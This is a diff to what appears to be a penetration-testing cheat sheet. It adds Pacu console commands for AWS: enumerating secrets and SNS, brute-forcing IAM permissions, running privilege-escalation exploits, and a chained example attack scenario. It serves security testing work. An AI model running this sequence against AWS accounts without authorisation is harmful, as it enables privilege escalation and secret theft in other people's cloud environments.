@@ -976,16 +976,50 @@ Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > set_regions <REGION>
 ### Enumeration
 
 ```console
-Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > whoami                                       // get information about current user
-Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run aws__enum_account                        // enumerate current user account
-Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__enum_permissions                    // enumerate current users permissions + run whoami again afterwards
-Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__enum_users_roles_policies_groups    // enumerate users, roles, policies and groups
-Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > data iam                                     // access enumerated iam data
-Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run lambda__enum                             // enumerate all lambda functions on the account
-Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run lambda__enum --region <REGION>           // enumerate lambda functions for a specific reagion
-Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > data lambda                                  // access enumerated data for lambda
-Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run ec2__enum                                // enumerate all ec2 instances
-Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > data ec2                                     // access enumerate data for all ec2 instances
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > whoami                                          // get information about current user
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run aws__enum_account                           // enumerate current user account
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__enum_permissions                       // enumerate current users permissions + run whoami again afterwards
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__enum_users_roles_policies_groups       // enumerate users, roles, policies and groups
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > data iam                                        // access enumerated iam data
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run lambda__enum                                // enumerate all lambda functions on the account
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run lambda__enum --region <REGION>              // enumerate lambda functions for a specific reagion
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > data lambda                                     // access enumerated data for lambda
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run ec2__enum                                   // enumerate all ec2 instances
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > data ec2                                        // access enumerate data for all ec2 instances
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run elasticbeanstalk__enum --region <REGION>    // enumerate all elastic beanstalk instances on the account
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run secrets__enum --region <REGION>             // enumerate secrets
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run sns__enum --region <REGION>                 // enumerate all sns configurations on the account
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > data                                            // show the sns data
+```
+
+### Brute Forcing
+
+```console
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__bruteforce_permissions --region <REGION>    // brute force iam permissions
+```
+
+### Privilege Escalation
+
+```console
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__privesc_scan                                  // run iam privilege escalation scan and perform exploitation
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__privesc_scan --scan-only                      // run iam privilege escalation scan but dont perform exploitation
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__privesc_scan --user-methods <METHOD>          // run iam privilege escalation scan with a specific user-method
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run sns__subscribe --topics <TOPIC> --email <EMAIL>    // run sns subscription exploitation
+```
+
+### Example Attack Scenario
+
+```console
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run elasticbeanstalk__enum --region <REGION>         // enumerate elastic beanstalk
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__bruteforce_permissions --region <REGION>    // brute force iam permissions
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__enum_permissions                            // enumeraate iam permissions
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__privesc_scan --scan-only                    // scan for iam privilege escalation vectors
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run iam__privesc_scan --user-methods <METHOD>        // exploit iam user-method
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run secrets__enum --region <REGION>                  // enumerate secrets
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > search sns                                           // search for sns options
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run sns__enum --region <REGION>                      // run sns enumeration
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > data                                                 // get sns data
+Pacu (<SESSION>:AKIAIOSFODNN7EXAMPLE) > run sns__subscribe --topics <TOPIC> --email <EMAIL>  // exploit sns vulnerable subscription
 ```
 
 ## S3 Account Search
